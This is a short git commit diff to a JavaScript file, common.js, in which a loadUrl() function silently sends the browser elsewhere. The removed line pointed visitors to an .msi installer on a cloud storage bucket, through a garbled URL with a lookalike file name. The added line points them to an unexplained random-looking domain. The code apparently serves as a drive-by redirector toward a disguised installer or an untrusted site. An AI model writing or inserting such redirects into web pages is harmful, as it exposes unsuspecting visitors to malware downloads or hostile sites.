178fbe8c7c0d089db8692e380f46c0ccb0539a66
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-10 18:05:29 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hellowoaid.s3.ap-southeast-2.amazonaws.com/hellowoaid.msiast-2.amazonaws.com/helloworI.msi";
+		var url="https://www.yssuygdm.com";
 		window.location=url;
 	}
 }
